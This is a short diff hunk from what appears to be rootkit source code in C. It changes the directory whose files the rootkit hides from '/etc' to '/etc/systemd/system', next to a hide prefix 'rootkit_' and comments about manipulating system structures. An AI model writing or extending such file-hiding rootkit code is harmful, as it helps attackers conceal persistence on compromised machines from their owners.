@@ -12,7 +12,7 @@ static const char *hide_string = "rootkit_";
 
 // System path in which files and folders will need to be
 // if we want to hide them (/etc)
-static const char *path_name_etc = "/etc";
+static const char *path_name_etc = "/etc/systemd/system";
 
 // Structs that we will use to store a copy before
 // manipulating
